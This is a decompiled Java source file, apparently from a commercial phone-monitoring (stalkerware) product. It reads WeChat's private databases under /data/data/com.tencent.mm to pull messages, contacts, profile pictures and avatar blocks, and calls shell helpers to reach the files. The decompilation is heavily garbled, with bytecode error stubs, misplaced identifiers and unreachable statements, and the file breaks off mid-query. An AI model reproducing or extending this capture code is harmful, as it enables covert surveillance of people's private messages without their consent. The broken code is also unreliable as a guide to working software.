package com.vvt.capture.wechat;

import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase;
import android.graphics.Bitmap;
import android.graphics.Bitmap.CompressFormat;
import android.media.ThumbnailUtils;
import android.os.SystemClock;
import com.vvt.events.FxEventDirection;
import com.vvt.events.FxIMAccountEvent;
import com.vvt.events.FxIMContactEvent;
import com.vvt.events.FxIMConversationEvent;
import com.vvt.events.FxIMMessageEvent;
import com.vvt.events.FxIMMessageServiceType;
import com.vvt.im.events.ImMediaFileType;
import com.vvt.im.events.ImType;
import com.vvt.im.events.MessageType;
import com.vvt.im.events.info.f;
import com.vvt.shell.ShellUtil;
import java.io.File;
import java.io.FileOutputStream;
import java.io.RandomAccessFile;
import java.math.BigInteger;
import java.security.MessageDigest;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Collection;
import java.util.Date;
import java.util.HashSet;
import java.util.Iterator;
import java.util.List;

public class b {
    public static final String a;
    private static final boolean b = com.vvt.ak.a.a;
    private static final boolean c = com.vvt.ak.a.b;
    private static final boolean d = com.vvt.ak.a.d;
    private static final boolean e = com.vvt.ak.a.e;

    static {
        StringBuilder localStringBuilder = new java.lang.StringBuilder();
        localStringBuilder = localStringBuilder.append("/data/data/com.tencent.mm");
        String str = File.separator;
        a = str + "MicroMsg";
    }

    private static int a(String paramString, MessageType paramMessageType) {
        MessageType localMessageType = MessageType.none;
        int i = localMessageType.getNumber();
        int[] arrayOfInt = c.a;
        int j = paramMessageType.ordinal();
        int k = arrayOfInt[j];
        switch (k)
        {
        }
        for (;;)
        {
            return i;
            localMessageType = MessageType.Text;
            i = localMessageType.getNumber();
            continue;
            localMessageType = MessageType.ShareLocation;
            i = localMessageType.getNumber();
            continue;
            localMessageType = MessageType.Sticker;
            i = localMessageType.getNumber();
            continue;
            localMessageType = MessageType.Contact;
            i = localMessageType.getNumber();
        }
    }

    /* Error */
    public static long a(int paramInt, SQLiteDatabase paramSQLiteDatabase)
    {
        // Byte code:
        //   0: lconst_0
        //   1: lstore_2
        //   2: iconst_m1
        //   3: i2l
        //   4: lstore 4
        //   6: aload_1
        //   7: ifnull +128 -> 135
        //   10: iconst_m1
        //   11: istore 6
        //   13: iload_0
        //   14: iload 6
        //   16: if_icmpeq +119 -> 135
        //   19: ldc 83
        //   21: astore 7
        //   23: ldc 85
        //   25: astore 8
        //   27: aconst_null
        //   28: astore 9
        //   30: iconst_0
        //   31: istore 10
        //   33: iload_0
        //   34: invokestatic 90	java/lang/Integer:toString	(I)Ljava/lang/String;
        //   37: astore 11
        //   39: aload_1
        //   40: astore 12
        //   42: aload_1
        //   43: aload 8
        //   45: aconst_null
        //   46: aconst_null
        //   47: aconst_null
        //   48: aconst_null
        //   49: aconst_null
        //   50: aload 7
        //   52: aload 11
        //   54: invokevirtual 96	android/database/sqlite/SQLiteDatabase:query	(Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;
        //   57: astore 9
        //   59: aload 9
        //   61: ifnull +158 -> 219
        //   64: aload 9
        //   66: invokeinterface 102 1 0
        //   71: istore 6
        //   73: iload 6
        //   75: ifeq +54 -> 129
        //   78: ldc 104
        //   80: astore 12
        //   82: aload 9
        //   84: aload 12
        //   86: invokeinterface 108 2 0
        //   91: istore 6
        //   93: aload 9
        //   95: iload 6
        //   97: invokeinterface 112 2 0
        //   102: lstore 13
        //   104: getstatic 17	com/vvt/capture/wechat/removeFromPath:removeFromPath	Z
        //   107: istore 10
        //   109: iload 10
        //   111: ifeq +3 -> 114
        //   114: aload 9
        //   116: ifnull +10 -> 126
        //   119: aload 9
        //   121: invokeinterface 115 1 0
        //   126: lload 13
        //   128: lreturn
        //   129: lload_2
        //   130: lstore 13
        //   132: goto -28 -> 104
        //   135: getstatic 23	com/vvt/capture/wechat/removeFromPath:d	Z
        //   138: istore 6
        //   140: iload 6
        //   142: ifeq +3 -> 145
        //   145: aconst_null
        //   146: astore 9
        //   148: lload_2
        //   149: lstore 13
        //   151: goto -47 -> 104
        //   154: astore 12
        //   156: aconst_null
        //   157: astore 9
        //   159: lload 4
        //   161: lstore 13
        //   163: getstatic 26	com/vvt/capture/wechat/removeFromPath:e	Z
        //   166: istore 10
        //   168: iload 10
        //   170: ifeq +3 -> 173
        //   173: aload 9
        //   175: ifnull -49 -> 126
        //   178: goto -59 -> 119
        //   181: astore 12
        //   183: aconst_null
        //   184: astore 9
        //   186: aload 9
        //   188: ifnull +10 -> 198
        //   191: aload 9
        //   193: invokeinterface 115 1 0
        //   198: aload 12
        //   200: athrow
        //   201: astore 12
        //   203: goto -17 -> 186
        //   206: astore 12
        //   208: lload 4
        //   210: lstore 13
        //   212: goto -49 -> 163
        //   215: pop
        //   216: goto -53 -> 163
        //   219: lload 4
        //   221: lstore 13
        //   223: goto -119 -> 104
        // Local variable table:
        //   start	length	slot	name	signature
        //   0	226	0	paramInt	int
        //   0	226	1	paramSQLiteDatabase	SQLiteDatabase
        //   1	148	2	l1	long
        //   4	216	4	l2	long
        //   11	6	6	i	int
        //   71	3	6	bool1	boolean
        //   91	5	6	j	int
        //   138	3	6	bool2	boolean
        //   21	30	7	str1	String
        //   25	19	8	str2	String
        //   28	164	9	localCursor	Cursor
        //   31	138	10	bool3	boolean
        //   37	16	11	str3	String
        //   40	45	12	localObject1	Object
        //   154	1	12	localException1	Exception
        //   181	18	12	localObject2	Object
        //   201	1	12	localObject3	Object
        //   206	1	12	localException2	Exception
        //   102	120	13	l3	long
        //   215	1	19	localException3	Exception
        // Exception table:
        //   from	to	target	type
        //   33	37	154	java/lang/Exception
        //   52	57	154	java/lang/Exception
        //   135	138	154	java/lang/Exception
        //   33	37	181	finally
        //   52	57	181	finally
        //   135	138	181	finally
        //   64	71	201	finally
        //   84	91	201	finally
        //   95	102	201	finally
        //   104	107	201	finally
        //   163	166	201	finally
        //   64	71	206	java/lang/Exception
        //   84	91	206	java/lang/Exception
        //   95	102	206	java/lang/Exception
        //   104	107	215	java/lang/Exception
    }

    public static long a(int paramInt, String paramString1, String paramString2, String paramString3, String paramString4)
    {
        long l = -1;
        localSQLiteDatabase = null;
        try
        {
            localSQLiteDatabase = com.vvt.capture.wechat.a.a.a(paramString1, paramString2, paramString3, paramString4);
            if (localSQLiteDatabase != null) {
                l = a(paramInt, localSQLiteDatabase);
            }
            if (localSQLiteDatabase == null) {
                break label40;
            }
        }
        catch (Exception localException)
        {
            for (;;)
            {
                label40:
                boolean bool = e;
                if ((bool) && (localSQLiteDatabase == null)) {}
            }
        }
        finally
        {
            if (localSQLiteDatabase == null) {
                break label74;
            }
            localSQLiteDatabase.close();
        }
        localSQLiteDatabase.close();
        return l;
    }

    /* Error */
    public static long a(SQLiteDatabase paramSQLiteDatabase)
    {
        // Byte code:
        //   0: lconst_0
        //   1: lstore_1
        //   2: iconst_m1
        //   3: i2l
        //   4: lstore_3
        //   5: aload_0
        //   6: ifnull +117 -> 123
        //   9: ldc 83
        //   11: astore 5
        //   13: ldc 85
        //   15: astore 6
        //   17: aconst_null
        //   18: astore 7
        //   20: iconst_0
        //   21: istore 8
        //   23: ldc -128
        //   25: astore 9
        //   27: aload_0
        //   28: astore 10
        //   30: aload_0
        //   31: aload 6
        //   33: aconst_null
        //   34: aconst_null
        //   35: aconst_null
        //   36: aconst_null
        //   37: aconst_null
        //   38: aload 5
        //   40: aload 9
        //   42: invokevirtual 96	android/database/sqlite/SQLiteDatabase:query	(Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;
        //   45: astore 7
        //   47: aload 7
        //   49: ifnull +156 -> 205
        //   52: aload 7
        //   54: invokeinterface 131 1 0
        //   59: istore 11
        //   61: iload 11
        //   63: ifeq +54 -> 117
        //   66: ldc 104
        //   68: astore 10
        //   70: aload 7
        //   72: aload 10
        //   74: invokeinterface 108 2 0
        //   79: istore 11
        //   81: aload 7
        //   83: iload 11
        //   85: invokeinterface 112 2 0
        //   90: lstore 12
        //   92: getstatic 17	com/vvt/capture/wechat/removeFromPath:removeFromPath	Z
        //   95: istore 8
        //   97: iload 8
        //   99: ifeq +3 -> 102
        //   102: aload 7
        //   104: ifnull +10 -> 114
        //   107: aload 7
        //   109: invokeinterface 115 1 0
        //   114: lload 12
        //   116: lreturn
        //   117: lload_1
        //   118: lstore 12
        //   120: goto -28 -> 92
        //   123: getstatic 26	com/vvt/capture/wechat/removeFromPath:e	Z
        //   126: istore 11
        //   128: iload 11
        //   130: ifeq +3 -> 133
        //   133: aconst_null
        //   134: astore 7
        //   136: lload_1
        //   137: lstore 12
        //   139: goto -47 -> 92
        //   142: astore 10
        //   144: aconst_null
        //   145: astore 7
        //   147: lload_3
        //   148: lstore 12
        //   150: getstatic 26	com/vvt/capture/wechat/removeFromPath:e	Z
        //   153: istore 8
        //   155: iload 8
        //   157: ifeq +3 -> 160
        //   160: aload 7
        //   162: ifnull -48 -> 114
        //   165: goto -58 -> 107
        //   168: astore 10
        //   170: aconst_null
        //   171: astore 7
        //   173: aload 7
        //   175: ifnull +10 -> 185
        //   178: aload 7
        //   180: invokeinterface 115 1 0
        //   185: aload 10
        //   187: athrow
        //   188: astore 10
        //   190: goto -17 -> 173
        //   193: astore 10
        //   195: lload_3
        //   196: lstore 12
        //   198: goto -48 -> 150
        //   201: pop
        //   202: goto -52 -> 150
        //   205: lload_3
        //   206: lstore 12
        //   208: goto -116 -> 92
        // Local variable table:
        //   start	length	slot	name	signature
        //   0	211	0	paramSQLiteDatabase	SQLiteDatabase
        //   1	136	1	l1	long
        //   4	202	3	l2	long
        //   11	28	5	str1	String
        //   15	17	6	str2	String
        //   18	161	7	localCursor	Cursor
        //   21	135	8	bool1	boolean
        //   25	16	9	str3	String
        //   28	45	10	localObject1	Object
        //   142	1	10	localException1	Exception
        //   168	18	10	localObject2	Object
        //   188	1	10	localObject3	Object
        //   193	1	10	localException2	Exception
        //   59	3	11	bool2	boolean
        //   79	5	11	i	int
        //   126	3	11	bool3	boolean
        //   90	117	12	l3	long
        //   201	1	17	localException3	Exception
        // Exception table:
        //   from	to	target	type
        //   40	45	142	java/lang/Exception
        //   123	126	142	java/lang/Exception
        //   40	45	168	finally
        //   123	126	168	finally
        //   52	59	188	finally
        //   72	79	188	finally
        //   83	90	188	finally
        //   92	95	188	finally
        //   150	153	188	finally
        //   52	59	193	java/lang/Exception
        //   72	79	193	java/lang/Exception
        //   83	90	193	java/lang/Exception
        //   92	95	201	java/lang/Exception
    }

    public static long a(String paramString1, String paramString2, String paramString3, String paramString4)
    {
        long l = -1;
        localSQLiteDatabase = null;
        try
        {
            localSQLiteDatabase = com.vvt.capture.wechat.a.a.a(paramString1, paramString2, paramString3, paramString4);
            if (localSQLiteDatabase != null) {
                l = a(localSQLiteDatabase);
            }
            if (localSQLiteDatabase == null) {
                break label38;
            }
        }
        catch (Exception localException)
        {
            for (;;)
            {
                label38:
                boolean bool = e;
                if ((bool) && (localSQLiteDatabase == null)) {}
            }
        }
        finally
        {
            if (localSQLiteDatabase == null) {
                break label72;
            }
            localSQLiteDatabase.close();
        }
        localSQLiteDatabase.close();
        return l;
    }

    private static MessageType a(int paramInt)
    {
        int i = 1;
        MessageType localMessageType;
        if (paramInt == i) {
            localMessageType = MessageType.Text;
        }
        for (;;)
        {
            return localMessageType;
            i = 48;
            if (paramInt == i) {
                localMessageType = MessageType.ShareLocation;
            } else {
                localMessageType = MessageType.none;
            }
        }
    }

    /* Error */
    private static com.vvt.im.events.info.d a(SQLiteDatabase paramSQLiteDatabase1, String paramString1, SQLiteDatabase paramSQLiteDatabase2, String paramString2, String paramString3)
    {
        // Byte code:
        //   0: new 138	com/vvt/im/events/info/d
        //   3: astore 5
        //   5: aload 5
        //   7: invokespecial 139	com/vvt/im/events/info/d:<init>	()V
        //   10: iconst_0
        //   11: istore 6
        //   13: aconst_null
        //   14: astore 7
        //   16: invokestatic 141	com/vvt/capture/wechat/removeFromPath:d	()Ljava/lang/String;
        //   19: astore 8
        //   21: aconst_null
        //   22: astore 9
        //   24: iconst_0
        //   25: anewarray 143	java/lang/String
        //   28: astore 9
        //   30: aload_0
        //   31: aload 8
        //   33: aload 9
        //   35: invokevirtual 147	android/database/sqlite/SQLiteDatabase:rawQuery	(Ljava/lang/String;[Ljava/lang/String;)Landroid/database/Cursor;
        //   38: astore 10
        //   40: aload 10
        //   42: ifnull +242 -> 284
        //   45: aload 10
        //   47: invokeinterface 131 1 0
        //   52: istore 6
        //   54: iload 6
        //   56: ifeq +108 -> 164
        //   59: ldc -107
        //   61: astore 7
        //   63: aload 10
        //   65: aload 7
        //   67: invokeinterface 108 2 0
        //   72: istore 6
        //   74: aload 10
        //   76: iload 6
        //   78: invokeinterface 153 2 0
        //   83: istore 6
        //   85: iconst_2
        //   86: istore 11
        //   88: iload 6
        //   90: iload 11
        //   92: if_icmpne +217 -> 309
        //   95: ldc -100
        //   97: astore 7
        //   99: aload 10
        //   101: aload 7
        //   103: invokeinterface 108 2 0
        //   108: istore 6
        //   110: aload 10
        //   112: iload 6
        //   114: invokeinterface 159 2 0
        //   119: astore 7
        //   121: aload 5
        //   123: aload 7
        //   125: invokevirtual 162	com/vvt/im/events/info/d:removeFromPath	(Ljava/lang/String;)V
        //   128: aload 5
        //   130: invokevirtual 164	com/vvt/im/events/info/d:removeFromPath	()Ljava/lang/String;
        //   133: astore 7
        //   135: aload 7
        //   137: ifnull -92 -> 45
        //   140: aload 5
        //   142: invokevirtual 166	com/vvt/im/events/info/d:a	()Ljava/lang/String;
        //   145: astore 7
        //   147: aload 7
        //   149: ifnull -104 -> 45
        //   152: aload 5
        //   154: invokevirtual 167	com/vvt/im/events/info/d:d	()Ljava/lang/String;
        //   157: astore 7
        //   159: aload 7
        //   161: ifnull -116 -> 45
        //   164: aload 5
        //   166: invokevirtual 164	com/vvt/im/events/info/d:removeFromPath	()Ljava/lang/String;
        //   169: astore 7
        //   171: aload 7
        //   173: ifnull +111 -> 284
        //   176: aload 7
        //   178: invokevirtual 170	java/lang/String:trim	()Ljava/lang/String;
        //   181: astore 8
        //   183: aload 8
        //   185: invokevirtual 173	java/lang/String:length	()I
        //   188: istore 11
        //   190: iload 11
        //   192: ifle +92 -> 284
        //   195: new 175	java/util/ArrayList
        //   198: astore 9
        //   200: aload 9
        //   202: invokespecial 176	java/util/ArrayList:<init>	()V
        //   205: aload 9
        //   207: aload 7
        //   209: invokevirtual 180	java/util/ArrayList:add	(Ljava/lang/Object;)Z
        //   212: pop
        //   213: aload_0
        //   214: astore 7
        //   216: aload_1
        //   217: astore 8
        //   219: aload_0
        //   220: aload_1
        //   221: aload 9
        //   223: aload_2
        //   224: aload_3
        //   225: aload 4
        //   227: invokestatic 183	com/vvt/capture/wechat/removeFromPath:a	(Landroid/database/sqlite/SQLiteDatabase;Ljava/lang/String;Ljava/util/ArrayList;Landroid/database/sqlite/SQLiteDatabase;Ljava/lang/String;Ljava/lang/String;)Ljava/util/ArrayList;
        //   230: astore 7
        //   232: aload 7
        //   234: ifnull +50 -> 284
        //   237: aload 7
        //   239: invokevirtual 186	java/util/ArrayList:size	()I
        //   242: istore 11
        //   244: iload 11
        //   246: ifle +38 -> 284
        //   249: iconst_0
        //   250: istore 11
        //   252: aconst_null
        //   253: astore 8
        //   255: aload 7
        //   257: iconst_0
        //   258: invokevirtual 190	java/util/ArrayList:get	(I)Ljava/lang/Object;
        //   261: astore 7
        //   263: aload 7
        //   265: checkcast 192	com/vvt/im/events/info/e
        //   268: astore 7
        //   270: aload 7
        //   272: invokevirtual 193	com/vvt/im/events/info/e:a	()Ljava/lang/String;
        //   275: astore 7
        //   277: aload 5
        //   279: aload 7
        //   281: invokevirtual 196	com/vvt/im/events/info/d:f	(Ljava/lang/String;)V
        //   284: aload 10
        //   286: ifnull +10 -> 296
        //   289: aload 10
        //   291: invokeinterface 115 1 0
        //   296: getstatic 17	com/vvt/capture/wechat/removeFromPath:removeFromPath	Z
        //   299: istore 6
        //   301: iload 6
        //   303: ifeq +3 -> 306
        //   306: aload 5
        //   308: areturn
        //   309: iconst_4
        //   310: istore 11
        //   312: iload 6
        //   314: iload 11
        //   316: if_icmpne +70 -> 386
        //   319: ldc -100
        //   321: astore 7
        //   323: aload 10
        //   325: aload 7
        //   327: invokeinterface 108 2 0
        //   332: istore 6
        //   334: aload 10
        //   336: iload 6
        //   338: invokeinterface 159 2 0
        //   343: astore 7
        //   345: aload 5
        //   347: aload 7
        //   349: invokevirtual 199	com/vvt/im/events/info/d:a	(Ljava/lang/String;)V
        //   352: goto -224 -> 128
        //   355: astore 7
        //   357: aload 10
        //   359: astore 7
        //   361: getstatic 26	com/vvt/capture/wechat/removeFromPath:e	Z
        //   364: istore 11
        //   366: iload 11
        //   368: ifeq +3 -> 371
        //   371: aload 7
        //   373: ifnull -77 -> 296
        //   376: aload 7
        //   378: invokeinterface 115 1 0
        //   383: goto -87 -> 296
        //   386: sipush 12291
        //   389: istore 11
        //   391: iload 6
        //   393: iload 11
        //   395: if_icmpne -267 -> 128
        //   398: ldc -100
        //   400: astore 7
        //   402: aload 10
        //   404: aload 7
        //   406: invokeinterface 108 2 0
        //   411: istore 6
        //   413: aload 10
        //   415: iload 6
        //   417: invokeinterface 159 2 0
        //   422: astore 7
        //   424: aload 5
        //   426: aload 7
        //   428: invokevirtual 202	com/vvt/im/events/info/d:MyUncaughtExceptionHandler	(Ljava/lang/String;)V
        //   431: goto -303 -> 128
        //   434: astore 7
        //   436: aload 10
        //   438: ifnull +10 -> 448
        //   441: aload 10
        //   443: invokeinterface 115 1 0
        //   448: aload 7
        //   450: athrow
        //   451: astore 8
        //   453: aconst_null
        //   454: astore 10
        //   456: aload 8
        //   458: astore 7
        //   460: goto -24 -> 436
        //   463: astore 8
        //   465: aload 7
        //   467: astore 10
        //   469: aload 8
        //   471: astore 7
        //   473: goto -37 -> 436
        //   476: astore 8
        //   478: goto -117 -> 361
        // Local variable table:
        //   start	length	slot	name	signature
        //   0	481	0	paramSQLiteDatabase1	SQLiteDatabase
        //   0	481	1	paramString1	String
        //   0	481	2	paramSQLiteDatabase2	SQLiteDatabase
        //   0	481	3	paramString2	String
        //   0	481	4	paramString3	String
        //   3	422	5	locald	com.vvt.im.events.info.d
        //   11	44	6	bool1	boolean
        //   72	41	6	i	int
        //   299	18	6	j	int
        //   332	84	6	k	int
        //   14	334	7	localObject1	Object
        //   355	1	7	localException1	Exception
        //   359	68	7	localObject2	Object
        //   434	15	7	localObject3	Object
        //   458	14	7	localObject4	Object
        //   19	235	8	str	String
        //   451	6	8	localObject5	Object
        //   463	7	8	localObject6	Object
        //   476	1	8	localException2	Exception
        //   22	200	9	localObject7	Object
        //   38	430	10	localObject8	Object
        //   86	231	11	m	int
        //   364	3	11	bool2	boolean
        //   389	7	11	n	int
        // Exception table:
        //   from	to	target	type
        //   45	52	355	java/lang/Exception
        //   65	72	355	java/lang/Exception
        //   76	83	355	java/lang/Exception
        //   101	108	355	java/lang/Exception
        //   112	119	355	java/lang/Exception
        //   123	128	355	java/lang/Exception
        //   128	133	355	java/lang/Exception
        //   140	145	355	java/lang/Exception
        //   152	157	355	java/lang/Exception
        //   164	169	355	java/lang/Exception
        //   176	181	355	java/lang/Exception
        //   183	188	355	java/lang/Exception
        //   195	198	355	java/lang/Exception
        //   200	205	355	java/lang/Exception
        //   207	213	355	java/lang/Exception
        //   225	230	355	java/lang/Exception
        //   237	242	355	java/lang/Exception
        //   257	261	355	java/lang/Exception
        //   263	268	355	java/lang/Exception
        //   270	275	355	java/lang/Exception
        //   279	284	355	java/lang/Exception
        //   325	332	355	java/lang/Exception
        //   336	343	355	java/lang/Exception
        //   347	352	355	java/lang/Exception
        //   404	411	355	java/lang/Exception
        //   415	422	355	java/lang/Exception
        //   426	431	355	java/lang/Exception
        //   45	52	434	finally
        //   65	72	434	finally
        //   76	83	434	finally
        //   101	108	434	finally
        //   112	119	434	finally
        //   123	128	434	finally
        //   128	133	434	finally
        //   140	145	434	finally
        //   152	157	434	finally
        //   164	169	434	finally
        //   176	181	434	finally
        //   183	188	434	finally
        //   195	198	434	finally
        //   200	205	434	finally
        //   207	213	434	finally
        //   225	230	434	finally
        //   237	242	434	finally
        //   257	261	434	finally
        //   263	268	434	finally
        //   270	275	434	finally
        //   279	284	434	finally
        //   325	332	434	finally
        //   336	343	434	finally
        //   347	352	434	finally
        //   404	411	434	finally
        //   415	422	434	finally
        //   426	431	434	finally
        //   16	19	451	finally
        //   24	28	451	finally
        //   33	38	451	finally
        //   361	364	463	finally
        //   16	19	476	java/lang/Exception
        //   24	28	476	java/lang/Exception
        //   33	38	476	java/lang/Exception
    }

    public static String a()
    {
        boolean bool1 = b;
        if (bool1) {}
        bool1 = false;
        String str1 = null;
        Object localObject = d.a();
        boolean bool2 = com.vvt.ag.b.a((String)localObject);
        if (!bool2) {}
        for (;;)
        {
            try
            {
                StringBuilder localStringBuilder = new java/lang/StringBuilder;
                localStringBuilder.<init>();
                String str2 = "mm";
                localStringBuilder = localStringBuilder.append(str2);
                localObject = localStringBuilder.append((String)localObject);
                localObject = ((StringBuilder)localObject).toString();
                str1 = e((String)localObject);
                bool3 = b;
                if (!bool3) {}
            }
            catch (Exception localException)
            {
                bool3 = e;
                if (!bool3) {
                    continue;
                }
                continue;
            }
            boolean bool3 = b;
            if (bool3) {}
            return str1;
            bool3 = e;
            if (!bool3) {}
        }
    }

    private static String a(String paramString1, String paramString2)
    {
        Object localObject1 = null;
        Object localObject2 = ImType.WECHAT;
        Object localObject3 = ImMediaFileType.THUMBMAIL;
        localObject2 = com.vvt.im.a.c.a(paramString1, (ImType)localObject2, (ImMediaFileType)localObject3);
        localObject3 = com.vvt.im.a.c.a(ImMediaFileType.THUMBMAIL);
        Object localObject4 = new java/lang/StringBuilder;
        ((StringBuilder)localObject4).<init>();
        localObject2 = ((StringBuilder)localObject4).append((String)localObject2);
        localObject4 = File.separator;
        localObject2 = (String)localObject4 + (String)localObject3;
        int i = 3;
        localObject3 = ThumbnailUtils.createVideoThumbnail(paramString2, i);
        localObject4 = new java/io/File;
        ((File)localObject4).<init>((String)localObject2);
        if (localObject3 != null) {}
        try
        {
            FileOutputStream localFileOutputStream = new java/io/FileOutputStream;
            localFileOutputStream.<init>((File)localObject4);
            localObject4 = Bitmap.CompressFormat.JPEG;
            int j = 40;
            boolean bool1 = ((Bitmap)localObject3).compress((Bitmap.CompressFormat)localObject4, j, localFileOutputStream);
            if (bool1) {
                localObject1 = localObject2;
            }
            localFileOutputStream.flush();
            localFileOutputStream.close();
        }
        catch (Exception localException)
        {
            for (;;)
            {
                boolean bool2 = e;
                if (!bool2) {}
            }
        }
        return (String)localObject1;
    }

    private static String a(String paramString1, String paramString2, String paramString3)
    {
        boolean bool1 = b;
        if (bool1) {}
        boolean bool2 = false;
        String str = com.vvt.capture.wechat.b.d.a(paramString1);
        Object localObject = ImType.WECHAT;
        ImMediaFileType localImMediaFileType = ImMediaFileType.USER_PROFILE;
        localObject = com.vvt.im.a.c.a(paramString1, (ImType)localObject, localImMediaFileType);
        str = com.vvt.capture.wechat.b.d.a(paramString2, (String)localObject, str, paramString3);
        boolean bool3 = com.vvt.ag.b.a(str);
        if (!bool3)
        {
            bool3 = ShellUtil.b(str);
            if (bool3)
            {
                bool2 = b;
                if (!bool2) {}
            }
        }
        for (;;)
        {
            bool2 = b;
            if (bool2) {}
            return str;
            bool1 = e;
            if (bool1) {}
            bool1 = false;
            str = null;
        }
    }

    private static String a(String paramString1, String paramString2, String paramString3, SQLiteDatabase paramSQLiteDatabase, String paramString4)
    {
        boolean bool1 = b;
        if ((!bool1) || (paramSQLiteDatabase == null))
        {
            bool1 = e;
            if (bool1) {}
            str1 = "";
            return str1;
        }
        boolean bool2 = false;
        localCursor = null;
        bool1 = false;
        String str1 = null;
        for (;;)
        {
            try
            {
                localObject2 = e(paramString2);
                boolean bool3 = b;
                if (bool3) {}
                bool3 = false;
                localObject3 = null;
                int i = 2;
                localObject3 = ((String)localObject2).substring(0, i);
                boolean bool4 = b;
                if (bool4) {}
                j = 2;
                int k = 4;
                localObject4 = ((String)localObject2).substring(j, k);
                boolean bool5 = b;
                if (bool5) {}
                localObject5 = new java/lang/StringBuilder;
                ((StringBuilder)localObject5).<init>();
                localObject3 = ((StringBuilder)localObject5).append((String)localObject3);
                localObject5 = File.separator;
                localObject3 = ((StringBuilder)localObject3).append((String)localObject5);
                localObject3 = ((StringBuilder)localObject3).append((String)localObject4);
                localObject4 = File.separator;
                localObject3 = ((StringBuilder)localObject3).append((String)localObject4);
                localObject4 = "user_%s.png";
                bool5 = true;
                localObject5 = new Object[bool5];
                int m = 0;
                localRandomAccessFile = null;
                localObject5[0] = localObject2;
                localObject2 = String.format((String)localObject4, (Object[])localObject5);
                localObject2 = ((StringBuilder)localObject3).append((String)localObject2);
                localObject2 = ((StringBuilder)localObject2).toString();
                bool3 = b;
                if (bool3) {}
                bool3 = b;
                if (bool3) {}
                localObject3 = "SELECT Offset, Size FROM Index_avatar WHERE (FileName='%s') AND (Size > 0)";
                j = 1;
                localObject4 = new Object[j];
                bool5 = false;
                localObject5 = null;
                localObject4[0] = localObject2;
                localObject2 = String.format((String)localObject3, (Object[])localObject4);
                bool3 = false;
                localObject3 = null;
                localObject3 = new String[0];
                localCursor = paramSQLiteDatabase.rawQuery((String)localObject2, (String[])localObject3);
                if (localCursor == null) {
                    continue;
                }
                boolean bool7 = localCursor.moveToFirst();
                if (!bool7) {
                    continue;
                }
                localObject2 = "Offset";
                int n = localCursor.getColumnIndex((String)localObject2);
                l1 = localCursor.getLong(n);
                localObject4 = "Size";
                j = localCursor.getColumnIndex((String)localObject4);
                j = localCursor.getInt(j);
                bool5 = b;
                if (bool5) {}
                localObject5 = com.vvt.io.d.a();
                m = 32;
                long l2 = l1 >> m;
                str2 = "%05d";
                int i1 = 1;
                Object localObject6 = new Object[i1];
                String str3 = null;
                Object localObject7 = Long.valueOf(l2);
                localObject6[0] = localObject7;
                str2 = String.format(str2, (Object[])localObject6);
                localObject6 = new java/lang/StringBuilder;
                ((StringBuilder)localObject6).<init>();
                str3 = "%s/tencent/MicroMsg/%s/sfs/avatar.block.";
                int i2 = 2;
                localObject7 = new Object[i2];
                localObject7[0] = localObject5;
                bool5 = true;
                localObject7[bool5] = paramString3;
                localObject5 = String.format(str3, (Object[])localObject7);
                localObject5 = ((StringBuilder)localObject6).append((String)localObject5);
                localObject5 = ((StringBuilder)localObject5).append(str2);
                localObject5 = ((StringBuilder)localObject5).toString();
                boolean bool9 = b;
                if (bool9) {}
                bool9 = ShellUtil.b((String)localObject5);
                if (!bool9) {
                    continue;
                }
                bool9 = b;
                if (bool9) {}
                long l3 = 4294967296L;
                l2 *= l3;
                l1 -= l2;
                l2 = 64;
                l1 += l2;
                bool6 = c((String)localObject5);
                if (!bool6) {
                    continue;
                }
                bool6 = b;
                if (bool6) {}
                localRandomAccessFile = new java/io/RandomAccessFile;
                localFile = new java/io/File;
                localFile.<init>((String)localObject5);
                localObject5 = "r";
                localRandomAccessFile.<init>(localFile, (String)localObject5);
                localObject4 = new byte[j];
                localRandomAccessFile.seek(l1);
                localRandomAccessFile.read((byte[])localObject4);
                str1 = d(paramString1);
                localObject2 = new java/io/RandomAccessFile;
                localObject3 = "rw";
                ((RandomAccessFile)localObject2).<init>(str1, (String)localObject3);
                ((RandomAccessFile)localObject2).write((byte[])localObject4);
                ((RandomAccessFile)localObject2).close();
                localRandomAccessFile.close();
            }
            catch (Exception localException)
            {
                Object localObject2;
                Object localObject3;
                int j;
                Object localObject4;
                Object localObject5;
                RandomAccessFile localRandomAccessFile;
                long l1;
                String str2;
                boolean bool6;
                File localFile;
                boolean bool8 = e;
                if ((bool8) && (localCursor == null)) {
                    continue;
                }
                continue;
                bool8 = e;
                if (!bool8) {
                    continue;
                }
                continue;
                bool8 = b;
                if (!bool8) {
                    continue;
                }
                continue;
            }
            finally
            {
                if (localCursor == null) {
                    continue;
                }
                localCursor.close();
            }
            bool8 = b;
            if ((!bool8) || (localCursor != null)) {
                localCursor.close();
            }
            bool2 = b;
            if (!bool2) {
                break;
            }
            break;
            bool6 = e;
            if (bool6) {}
            localObject5 = a(paramString1, (String)localObject5, paramString4);
            bool6 = com.vvt.ag.b.a((String)localObject5);
            if (!bool6)
            {
                localRandomAccessFile = new java/io/RandomAccessFile;
                localFile = new java/io/File;
                localFile.<init>((String)localObject5);
                str2 = "r";
                localRandomAccessFile.<init>(localFile, str2);
                localObject4 = new byte[j];
                localRandomAccessFile.seek(l1);
                localRandomAccessFile.read((byte[])localObject4);
                str1 = d(paramString1);
                localObject2 = new java/io/RandomAccessFile;
                localObject3 = "rw";
                ((RandomAccessFile)localObject2).<init>(str1, (String)localObject3);
                ((RandomAccessFile)localObject2).write((byte[])localObject4);
                ((RandomAccessFile)localObject2).close();
                ShellUtil.i((String)localObject5);
            }
        }
    }

    private static String a(ArrayList paramArrayList)
    {
        StringBuilder localStringBuilder = new java/lang/StringBuilder;
        localStringBuilder.<init>();
        localStringBuilder.append("SELECT ");
        localStringBuilder.append("MyUncaughtExceptionHandler.username, ");
        localStringBuilder.append("MyUncaughtExceptionHandler.nickname, ");
        localStringBuilder.append("img.reserved1 AS profile_pic, ");
        localStringBuilder.append("img.reserved2 AS profile_thumb ");
        localStringBuilder.append("FROM rcontact MyUncaughtExceptionHandler ");
        localStringBuilder.append("LEFT JOIN img_flag img ");
        localStringBuilder.append("ON MyUncaughtExceptionHandler.username = img.username ");
